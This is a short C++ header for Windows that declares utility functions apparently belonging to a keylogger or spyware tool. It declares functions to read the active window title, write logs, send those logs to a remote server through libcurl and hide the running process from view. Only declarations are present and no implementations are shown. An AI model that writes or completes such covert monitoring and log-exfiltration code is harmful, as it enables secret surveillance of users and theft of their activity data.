#pragma once

#include <Windows.h>
#include <string>
#include <chrono>
#include <ctime>
#include <fstream>
#include <curl/curl.h>
#include <memory>

namespace utils {
    // Get current timestamp as string
    std::wstring get_timestamp();
    
    // Get active window title
    std::wstring get_active_window_title();
    
    // Send logs to remote server
    bool send_logs_to_server(const std::wstring& logs, const std::string& server_url);
    
    // Write to log with proper error handling
    void safe_log_write(std::wofstream& stream, const std::wstring& content);
    
    // Initialize CURL for remote logging
    bool initialize_remote_logging();
    
    // Cleanup CURL
    void cleanup_remote_logging();
    
    // Make process stealth
    void make_stealth();
} 